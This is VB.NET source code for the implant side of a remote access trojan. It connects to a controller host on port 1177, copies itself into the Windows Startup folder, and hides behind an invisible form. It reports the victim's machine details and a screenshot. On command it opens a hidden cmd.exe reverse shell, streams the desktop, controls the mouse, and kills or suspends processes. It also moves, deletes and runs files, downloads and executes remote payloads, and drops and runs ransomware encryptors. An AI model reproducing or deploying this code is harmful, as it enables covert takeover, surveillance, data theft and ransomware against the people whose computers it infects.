Imports System.Net.Sockets
Imports System.Collections.Generic
Imports System.Drawing
Imports Microsoft.VisualBasic.Strings
Imports System.Windows.Forms
Imports System.Drawing.Imaging
Imports System.Drawing.Drawing2D
Imports System.Runtime.InteropServices
Imports System, Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.IO
Imports System.Threading
Imports Microsoft.VisualBasic.Constants
Imports Microsoft.VisualBasic.Interaction
Imports Microsoft.VisualBasic.Conversion
Imports Microsoft.Win32
Imports System.Text
Imports System.Globalization
Imports Microsoft.VisualBasic.FileSystem
Module Serverx
    Dim picBox As New PictureBox
    Dim Encrypted As Boolean = False
    Public fastimg As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".jpg"
    Private Sub imge_desik()
        Dim bitmap As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Dim graphics__1 As Graphics = Graphics.FromImage(TryCast(bitmap, Image))
        graphics__1.CopyFromScreen(0, 0, 0, 0, bitmap.Size)
        picBox.SizeMode = PictureBoxSizeMode.AutoSize
        picBox.Image = bitmap
        Dim er As String = fastimg

        Dim bm As New Bitmap(picBox.Image)
        Dim width As Integer = 460
        Dim height As Integer = 360
        Dim thumb As New Bitmap(width, height)
        Dim g As Graphics = Graphics.FromImage(thumb)
        g.InterpolationMode = Drawing2D.InterpolationMode.Low
        g.DrawImage(bm, New Rectangle(0, 0, width, height), New Rectangle(0, 0, bm.Width, bm.Height), GraphicsUnit.Pixel)
        g.Dispose()
        thumb.Save(er, System.Drawing.Imaging.ImageFormat.Jpeg)

        bm.Dispose()
        thumb.Dispose()
    End Sub
    Dim WithEvents Tryer As New System.Windows.Forms.Timer
    Dim yy As String = "||"
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Private WithEvents c As New Client
    Private host As String = "[NoIP]"
    Private port As Integer = 1177
    Private pname As String = "PPPPP"
    Dim connected As Boolean
    Dim alaa(), text1, text2 As String
    Const spl As String = "abccba"
    Dim Form2 As New FormChat
    Private invoker As New System.Windows.Forms.Form
    Dim invokershow As Boolean = False
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Private cap As New RDP
    'Private US As New USB
    Private LO As Object = New System.IO.FileInfo(Application.ExecutablePath) : Private DJB As Object
    Private Sub RS(ByVal a As Object, ByVal e As Object)
        Try
            c.Send("rs" & yy & ENB(e.Data))
        Catch ex As System.Exception
        End Try
    End Sub
    Private Sub ex()
        Try
            c.Send("rsc" & yy)
        Catch ex As System.Exception
        End Try
    End Sub
    Private Sub Tryer_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Tryer.Tick
        On Error Resume Next
        copytostartup()
        If connected = False Then
            c.Connect(host, port)
        End If
    End Sub

    Sub Main()
        Try
            Tryer.Interval = 410
            connected = False

            connect()

            Tryer.Start()

        
            UPinvoker()

            System.Windows.Forms.Application.Run()
        Catch ex As System.Exception
        End Try
    End Sub


    Private Sub UPinvoker()
        invoker.Size = New Size(0, 0)
        invoker.ShowInTaskbar = False
        invoker.ShowIcon = False
        invoker.Opacity = 0
        invoker.Show()
        invokershow = True
    End Sub

    Private startuppath As String = ""
    Private Sub copytostartup()
        Dim dirto As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) : Dim AppPath As String = Application.ExecutablePath : Dim AutoStart As String = dirto & "/" : Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(dirto) : Dim name As String = Application.ExecutablePath.Replace(Application.StartupPath & "\", "") : Try : File.Copy(AppPath, AutoStart & name, True) : startuppath = dirto & "\" & name : Catch ex As Exception : End Try
    End Sub
    Private Sub connect()

        If connected = False Then
            c.Connect(host, port)
        End If

    End Sub
    Private Sub dsiconnected() Handles c.Disconnected
        connected = False
        Try
            If connected = False Then
                c.Connect(host, port)
            End If
        Catch ex As System.Exception
            dsiconnected()
        End Try
    End Sub
    Private Sub connectedx() Handles c.Connected
        connected = True
    End Sub

    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New System.IO.DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As System.IO.DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit" ' & subdi.LastWriteTime.ToLongDateString & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit" ' & f.LastWriteTime.ToLongDateString & "FileManagerSplit"
        Next
        Return files
    End Function
    Private Function CheckRansom() As String
        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "TockenOffice.blueeagle") Then
            Encrypted = True
            GoTo JumperLine
        Else
            Encrypted = False
        End If


JumperLine: If Encrypted = True Then
            Return "Yes"
        Else
            Return "No"
        End If
    End Function
    Private Declare Ansi Sub keybd_event Lib "user32.dll" (bVk As Byte, bScan As Byte, dwFlags As Integer, dwExtraInfo As Integer)

    Private Declare Ansi Function MapVirtualKey Lib "user32" Alias "MapVirtualKeyA" (wCode As Integer, wMapType As Integer) As Integer

    Private Sub data(ByVal b As Byte()) Handles c.Data
        Dim ala As String() = Split(BS(b), yy)
        Try
            Select Case ala(0)
                Case "info"
                    imge_desik()

                    c.Send("info" & "||" & pname & "||" & Environment.MachineName & "/" & Environment.UserName & "||" & My.Computer.Info.OSFullName & "||" & country & "||" & Convert.ToBase64String(System.IO.File.ReadAllBytes(fastimg)) & "||" & CheckRansom())
                Case "GetDrives"
                    c.Send("FileManager" & "||" & getDrives())
                Case "FileManager"
                    Try
                        c.Send("FileManager" & "||" & getFolders(ala(1)) & getFiles(ala(1)))
                    Catch
                        c.Send("FileManager" & "||" & "Error")
                    End Try
                Case "sendfileto"
                    System.IO.File.WriteAllBytes(ala(1), Convert.FromBase64String(ala(2)))
                    Threading.Thread.Sleep(1000)

                Case "downloadedfile"
                    System.IO.File.WriteAllBytes(Application.CommonAppDataPath & "\Computers\" & ala(2), Convert.FromBase64String(ala(1)))
                    Threading.Thread.Sleep(1000)
                Case "Delete"
                    Select Case ala(1)
                        Case "Folder"
                            System.IO.Directory.Delete(ala(2))
                        Case "File"
                            System.IO.File.Delete(ala(2))
                    End Select
                Case "Execute"
                    Process.Start(ala(1))
                Case "Rename"
                    Select Case ala(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(ala(2), ala(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(ala(2), ala(3))
                    End Select
                Case "openfm"
                    c.Send("openfm")

                Case "sendfile"
                    System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath & ala(1), Convert.FromBase64String(ala(2)))
                    Threading.Thread.Sleep(1000)
                    Process.Start(System.IO.Path.GetTempPath & ala(1))
                Case "download"
                    My.Computer.Network.DownloadFile(ala(1), System.IO.Path.GetTempPath & ala(2))
                    Threading.Thread.Sleep(1000)
                    Process.Start(System.IO.Path.GetTempPath & ala(2))

                Case "Endme"
                    End

                Case "getstartuppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "!!"
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    c.Send("!!" & yy & s.Width & yy & s.Height)

                Case "!"
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    c.Send("!" & yy & s.Width & yy & s.Height)
                Case "@"
                    Dim SizeOfimage As Integer = ala(1)
                    Dim Split As Integer = ala(2)
                    Dim Quality As Integer = ala(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New System.IO.MemoryStream
                    Dim CMD As String = "@" & yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    c.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(ala(1), ala(2))
                    mouse_event(ala(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(ala(1), ala(2))
                Case "dekey"
                    MsgBox("Key : " & ala(2))

                    ' keybd_event(Conversions.ToByte(ala(2)), CByte(MapVirtualKey(Conversions.ToInteger(ala(2)), 0)), Conversions.ToInteger(ala(1)), 0)
                Case "rss" ' start remote shell
                    Try
                        DJB.Kill()
                    Catch ex As System.Exception
                    End Try
                    DJB = New Process
                    DJB.StartInfo.RedirectStandardOutput = True
                    DJB.StartInfo.RedirectStandardInput = True
                    DJB.StartInfo.RedirectStandardError = True
                    DJB.StartInfo.FileName = "cmd.exe"
                    DJB.StartInfo.RedirectStandardError = True
                    AddHandler CType(DJB, Process).OutputDataReceived, AddressOf RS
                    AddHandler CType(DJB, Process).ErrorDataReceived, AddressOf RS
                    AddHandler CType(DJB, Process).Exited, AddressOf ex
                    DJB.StartInfo.UseShellExecute = False
                    DJB.StartInfo.CreateNoWindow = True
                    DJB.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    DJB.EnableRaisingEvents = True
                    c.Send("rss" & yy)
                    DJB.Start()
                    DJB.BeginErrorReadLine()
                    DJB.BeginOutputReadLine()
                Case "rs"
                    DJB.StandardInput.WriteLine(DEB(ala(1)))
                Case "rsc"
                    Try
                        DJB.Kill()
                    Catch ex As System.Exception
                    End Try
                    DJB = Nothing
                Case "viewimage"
                    c.Send("viewimage" & yy & Convert.ToBase64String(System.IO.File.ReadAllBytes(ala(1))) & yy)
                Case "openchat"
                    c.Send("readytochat")

                Case "\\"
                    c.Send("\\")
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim ProcessList As Process() = Process.GetProcesses()
                    For Each Proc As Process In ProcessList
                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
                    Next
                    c.Send("ProcessManager" & yy & allProcess)
                Case "KillProcess"
                    Dim eachprocess As String() = ala(1).Split("ProcessSplit")
                    For i As Integer = 0 To eachprocess.Length - 2
                        For Each RunningProcess As System.Diagnostics.Process In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                    Next
                Case "viewimage"
                    c.Send("viewimage" & yy & Convert.ToBase64String(System.IO.File.ReadAllBytes(ala(1))) & yy)

                Case "SProcess"
                    Dim eachprocess As String() = ala(1).Split("ProcessSplit")
                    For i As Integer = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        c.Send("SP")
                    Next
                Case "edittextfile"
                    Dim R As New System.IO.StreamReader(ala(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    c.Send("edittextfile" & yy & ala(1) & yy & d)
                Case "savetextfile"
                    Dim C As New System.IO.StreamWriter(ala(1))
                    C.WriteLine(ala(2))
                    C.Close()
                Case "viewimage"
                    c.Send("viewimage" & yy & Convert.ToBase64String(System.IO.File.ReadAllBytes(ala(1))) & yy)
                Case "creatnewtextfile"
                    Try
                        System.IO.File.Create(ala(1)).Dispose()
                    Catch ex As System.Exception
                        c.Send("msgbox" & yy & "Information" & yy & "File Name Already Exists")
                    End Try
                Case "setaswallpaper"
                    SystemParametersInfo(SETDESKWALLPAPER, 0, ala(1), UPDATEINIFILE)
                Case "getdesktoppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "gettemppath"
                    Dim specialfolder As String
                    specialfolder = System.IO.Path.GetTempPath
                    c.Send("getpath" & yy & specialfolder)
                Case "getmydocumentspath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "getmyimagespath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "getrecentpath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Recent)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "getmymusicpath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "gethistorypath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.History)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "hidefolderfile"
                    Dim hiden As FileAttribute = FileAttribute.Hidden
                    Try
                        SetAttr(ala(1), hiden)
                    Catch ex As System.Exception

                    End Try
                Case "showfolderfile"
                    Dim shown As FileAttribute = FileAttribute.Normal
                    Try
                        SetAttr(ala(1), shown)
                    Catch ex As System.Exception
                    End Try
                Case "fiprop"
                    Dim Infof As String = ""
                    Dim path As String = ala(1)
                    Dim fname As String = ala(3)
                    Dim ftype As String = ala(2)
                    If ala(2).Equals("File") Then

                        Infof = File.GetCreationTime(path).ToLongDateString & yy & File.GetCreationTime(path).ToLongTimeString & yy & File.GetLastWriteTimeUtc(path).ToLongDateString & yy & File.GetLastWriteTimeUtc(path).ToLongTimeString & "" & yy & File.GetLastAccessTime(path).ToLongDateString & yy & File.GetLastAccessTime(path).ToLongTimeString & yy & fname & yy & "File"
                        c.Send("fiprop" & yy & Infof)
                    Else
                        Infof = File.GetCreationTime(path).ToLongDateString & yy & File.GetCreationTime(path).ToLongTimeString & yy & File.GetLastWriteTimeUtc(path).ToLongDateString & yy & File.GetLastWriteTimeUtc(path).ToLongTimeString & "" & yy & File.GetLastAccessTime(path).ToLongDateString & yy & File.GetLastAccessTime(path).ToLongTimeString & yy & fname & yy & "File Folder"
                        c.Send("fiprop" & yy & Infof)
                    End If

                Case "stopchat"
                    Form2.close()
                    Form2.Showed = False

                Case "chat"
                    invoker.Invoke(New chatappd(AddressOf chatappds), ala(1), ala(2), ala(3))
                Case "renx"
                    pname = ala(1)
                Case "Uninstall"
                    Uninstall()

                Case "encRan"
                    System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath & ala(1), Convert.FromBase64String(ala(2)))
                    Threading.Thread.Sleep(1000)
                    Process.Start(System.IO.Path.GetTempPath & ala(1))

                Case "decRan"
                    System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath & ala(1), Convert.FromBase64String(ala(2)))
                    Threading.Thread.Sleep(1000)
                    Process.Start(System.IO.Path.GetTempPath & ala(1))
            End Select

        Catch ex As System.Exception

        End Try
    End Sub
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Delegate Sub chatappd(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
    Sub chatappds(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
        If Form2.Showed = True Then
            Form2.TextBox1.Text = Form2.TextBox1.Text & data1 & " : " & data3 & vbNewLine
        ElseIf Form2.Showed = False Then
            Form2 = New FormChat
            Form2.Main()
            Form2.TextBox1.Text = Form2.TextBox1.Text & data1 & " : " & data3 & vbNewLine
            Form2.Showed = True
        End If

    End Sub
    Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Enum ThreadAccess As Integer
        TERMINATE = (&H1)
        SUSPEND_RESUME = (&H2)
        GET_CONTEXT = (&H8)
        SET_CONTEXT = (&H10)
        SET_INFORMATION = (&H20)
        QUERY_INFORMATION = (&H40)
        SET_THREAD_TOKEN = (&H80)
        IMPERSONATE = (&H100)
        DIRECT_IMPERSONATION = (&H200)
    End Enum
    Public Declare Function OpenThread Lib "kernel32.dll" (ByVal dwDesiredAccess As ThreadAccess, ByVal bInheritHandle As Boolean, ByVal dwThreadId As UInteger) As IntPtr
    Public Declare Function SuspendThread Lib "kernel32.dll" (ByVal hThread As IntPtr) As UInteger
    Public Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As IntPtr) As UInteger
    Public Declare Function CloseHandle Lib "kernel32.dll" (ByVal hHandle As IntPtr) As Boolean
    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
        For Each t As ProcessThread In process.Threads
            Dim th As IntPtr
            th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
            If th <> IntPtr.Zero Then
                SuspendThread(th)
                CloseHandle(th)
            End If
        Next
    End Sub
    Public Class Client
        Private C As TcpClient
        Public Event Connected()
        Public Event Disconnected()
        Public Event Data(ByVal b As Byte())
        Private IsBuzy As Boolean = False
        Private SPL As String = "sbj-s"

        Public Function Statconnected() As Boolean
            Dim cc As Boolean
            Try
                If C.Client.Connected = True Then
                    cc = True
                End If
            Catch ex As System.Exception
            End Try
            Return cc

        End Function
        Sub DisConnect()
            Try
                C.Close()
            Catch ex As System.Exception
            End Try
            C = Nothing
            RaiseEvent Disconnected()
        End Sub
        Sub Send(ByVal b As Byte())
            Try
                Dim m As New System.IO.MemoryStream
                m.Write(b, 0, b.Length)
                m.Write(SB(SPL), 0, SPL.Length)
                C.Client.Send(m.ToArray, 0, m.Length, SocketFlags.None)
            Catch ex As System.Exception
                DisConnect()
            End Try
        End Sub
        Sub Send(ByVal s As String)
            Send(SB(s))
        End Sub
        Function fx(ByVal b As Byte(), ByVal WRD As String) As System.Array
            Dim a As New System.Collections.Generic.List(Of Byte())
            Dim M As New System.IO.MemoryStream
            Dim MM As New System.IO.MemoryStream
            Dim T As String() = Microsoft.VisualBasic.Strings.Split(BS(b), WRD)
            M.Write(b, 0, T(0).Length)
            MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
            a.Add(M.ToArray)
            a.Add(MM.ToArray)
            M.Dispose()
            MM.Dispose()
            Return a.ToArray
        End Function



        Sub RC()
            IsBuzy = True
            Dim M As New System.IO.MemoryStream
            Dim cc As Integer = 0
re:
            Threading.Thread.Sleep(1)
            Try
                If C Is Nothing Then
                    GoTo co
                Else
                    If C.Client.Connected = False Then
                        GoTo co
                    Else
                        cc += 1
                        If cc > 100 Then
                            cc = 0
                            Try
                                If C.Client.Poll(-1, System.Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then
                                    GoTo co
                                End If
                            Catch ex As System.Exception
                                GoTo co
                            End Try
                        End If
                    End If
                End If
                If C.Available > 0 Then
                    Dim B(C.Available - 1) As Byte
                    C.Client.Receive(B, 0, B.Length, System.Net.Sockets.SocketFlags.None)
                    M.Write(B, 0, B.Length)
rr:
                    If BS(M.ToArray).Contains(SPL) Then
                        Dim A As System.Array = fx(M.ToArray, SPL)
                        RaiseEvent Data(A(0))
                        M.Dispose()
                        M = New System.IO.MemoryStream
                        If A.Length = 2 Then
                            M.Write(A(1), 0, A(1).length)
                            Threading.Thread.Sleep(1)
                            GoTo rr
                        End If
                    End If
                End If
            Catch ex As System.Exception
                GoTo co
            End Try
            GoTo re
co:
            IsBuzy = False
            DisConnect()
        End Sub

        Sub Connect(ByVal h As String, ByVal p As Integer)
            Try
                Try
                    If C IsNot Nothing Then
                        C.Close()
                        C = Nothing
                    End If
                Catch ex As System.Exception
                End Try
                Do Until IsBuzy = False
                    Threading.Thread.Sleep(1)
                Loop
                Try
                    C = New TcpClient
                    C.Connect(h, p)
                    Dim t As New System.Threading.Thread(AddressOf RC, 10)
                    t.Start()
                    RaiseEvent Connected()
                Catch ex As System.Exception
                End Try
            Catch ex As System.Exception
                RaiseEvent Disconnected()
            End Try
        End Sub
    End Class
    Public Class RDP
        Private Shared OA As New List(Of Bitmap)
        Private Shared OAA As New List(Of Point)
        Private Shared OM As New Bitmap(1, 1)
        Private Shared Function QZ(ByVal q As Integer) As Size
            Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Select Case q
                Case 0
                    Return zs
                Case 1
                    zs.Width = zs.Width / 1.1
                    zs.Height = zs.Height / 1.1
                Case 2
                    zs.Width = zs.Width / 1.3
                    zs.Height = zs.Height / 1.3
                Case 3
                    zs.Width = zs.Width / 1.5
                    zs.Height = zs.Height / 1.5
                Case 4
                    zs.Width = zs.Width / 1.9
                    zs.Height = zs.Height / 1.9
                Case 5
                    zs.Width = zs.Width / 2
                    zs.Height = zs.Height / 2
                Case 6
                    zs.Width = zs.Width / 2.1
                    zs.Height = zs.Height / 2.1
                Case 7
                    zs.Width = zs.Width / 2.2
                    zs.Height = zs.Height / 2.2
                Case 8
                    zs.Width = zs.Width / 2.5
                    zs.Height = zs.Height / 2.5
                Case 9
                    zs.Width = zs.Width / 3
                    zs.Height = zs.Height / 3
                Case 10
                    zs.Width = zs.Width / 3.5
                    zs.Height = zs.Height / 3.5
                Case 11
                    zs.Width = zs.Width / 4
                    zs.Height = zs.Height / 4
                Case 12
                    zs.Width = zs.Width / 5
                    zs.Height = zs.Height / 5
                Case 13
                    zs.Width = zs.Width / 6
                    zs.Height = zs.Height / 6
            End Select
            zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
            zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
            Return zs
        End Function
        Private Shared Function md5(ByVal bB As Byte()) As String
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            bB = md5Obj.ComputeHash(bB)
            Return System.Convert.ToBase64String(bB)
        End Function
        Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
            Dim j As Integer
            Dim encoders As ImageCodecInfo()
            encoders = ImageCodecInfo.GetImageEncoders()
            For j = 0 To encoders.Length
                If encoders(j).MimeType = M Then
                    Return encoders(j)
                End If
            Next j
            Return Nothing
        End Function
        Friend Sub Clear()
            oQ = -1
            oCo = -1
            oQu = -1
            OM = New Bitmap(1, 1)
        End Sub
        Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
            Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim B As New Bitmap(W, H)
            Dim g As Graphics = Graphics.FromImage(B)
            g.CompositingQuality = CompositingQuality.HighSpeed
            g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
            If Sh Then
                Try
                    Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
                Catch ex As Exception
                End Try
            End If
            g.Dispose()
            If Wi = 0 And He = 0 Then
                Return B
            Else
                Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
            End If
        End Function
        Private Shared oQ As Integer = 0
        Private Shared oCo As Integer = 0
        Private Shared oQu As Integer = 0
        Friend Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
            Dim ZS As New Size(QZ(q))
            ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
            ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
            If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
                OA.Clear()
                OAA.Clear()
                OM = New Bitmap(ZS.Width, ZS.Height)
            End If
            oQ = q
            oCo = co
            oQu = Qu

            Dim A As New List(Of Bitmap)
            Dim AA As New List(Of Point)
            Dim m As Bitmap
            If OA.Count > 0 Then
                A.AddRange(OA.ToArray)
                OA.Clear()
                AA.AddRange(OAA.ToArray)
                OAA.Clear()

                m = OM
                GoTo e
            End If
            m = Gd(ZS.Width, ZS.Height)
            Dim w As Integer = ZS.Width
            Dim h As Integer = ZS.Height
            Dim K As Integer = 0
            For i As Integer = 0 To co - 1
                For ii As Integer = 0 To co - 1
                    Dim y As Integer = h / co * i
                    Dim x As Integer = w / co * ii
                    Dim wc As Integer = w / co
                    Dim hc As Integer = h / co
                    If wc.ToString.Contains(".") Then
                        wc = Split(wc, ".")(0)
                    End If
                    If hc.ToString.Contains(".") Then
                        hc = Split(hc, ".")(0)
                    End If
                    Dim MM As New IO.MemoryStream
                    Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim b1 As Byte()
                    Dim b2 As Byte()
                    Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                    b1 = MM.ToArray
                    MM.Dispose()
                    MM = New IO.MemoryStream
                    MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                    b2 = MM.ToArray

                    MM.Dispose()
                    If md5(b1) = md5(b2) Then
                        Mj.Dispose()
                    Else
                        A.Add(Mj)
                        AA.Add(New Point(x, y))
                    End If
                    MJJ.Dispose()
nx:
                Next
            Next
e:

            If A.Count = 0 Then
                Return New Byte() {0}
            End If
            Dim hh As Integer = 0
            Dim QA As New List(Of Integer)
            For i As Integer = 0 To co * co / 5
                If i = A.Count Then Exit For
                QA.Add(i)
                hh += A(i).Height
            Next
            Dim xx As New Bitmap(A(0).Width, hh)
            Dim gg = Graphics.FromImage(xx)
            Dim tp As Integer = 0
            Dim s As String = m.Width & "." & m.Height & ","
            For Each i As Integer In QA
                s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
                gg.DrawImage(A(i), 0, tp)
                tp += A(i).Height
            Next
            s += "sblj3"
            For i As Integer = 0 To A.Count - 1
                If QA.Contains(i) = False Then
                    OA.Add(A(i))
                    OAA.Add(AA(i))
                End If
            Next
            gg.Dispose()
            Dim JA = New IO.MemoryStream
            Dim eps As EncoderParameters = New EncoderParameters(1)
            eps.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
            Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            xx.Save(JA, ici, eps)
            Dim J2 As New IO.MemoryStream
            J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
            J2.Write(JA.ToArray, 0, JA.Length)
            OM = m
            xx.Dispose()
            Return J2.ToArray
        End Function
    End Class

    Public Class FormChat
        Dim Form As New System.Windows.Forms.Form
        Public TextBox1 As New System.Windows.Forms.RichTextBox
        Public WithEvents TextBox2 As New System.Windows.Forms.TextBox
        Public Showed As Boolean

        Sub Main()
            Form.Size = New Size(433, 173)
            Form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
            Form.BackColor = Color.Black
            Form.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
            TextBox1.ForeColor = Color.Lime
            TextBox1.BackColor = Color.Black
            TextBox1.ReadOnly = True
            Dim panel1 As New System.Windows.Forms.Panel
            TextBox1.Parent = panel1
            TextBox1.Dock = System.Windows.Forms.DockStyle.Fill
            panel1.Size = New Size(433, 155)
            panel1.BackColor = Color.Red
            panel1.Controls.Add(TextBox1)
            Dim panel2 As New System.Windows.Forms.Panel
            panel2.Dock = System.Windows.Forms.DockStyle.Bottom
            panel2.BackColor = Color.Blue
            TextBox2.BackColor = Color.Black
            TextBox2.ForeColor = Color.Lime
            TextBox2.Parent = panel2
            TextBox2.Dock = System.Windows.Forms.DockStyle.Bottom
            panel2.Controls.Add(TextBox2)
            Form.Controls.Add(panel1)
            Form.Controls.Add(panel2)
            Form.ShowIcon = False
            Form.ShowInTaskbar = False
            Form.Show()
            Form.TopMost = True
            Showed = True
        End Sub
        Private Sub TextBox2_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles TextBox2.KeyDown
            If e.KeyValue = Keys.Enter Then
                If TextBox2.Text.Length > 0 Then
                    Serverx.c.Send("chatback" & "||" & TextBox2.Text)
                    TextBox1.Text = TextBox1.Text & Form.Text & " said: " & TextBox2.Text & vbNewLine
                    TextBox2.Text = ""
                Else
                End If
            End If
        End Sub
        Sub close()
            Form.Close()
            Showed = False
        End Sub
    End Class
    Private Sub Uninstall()

    End Sub
End Module

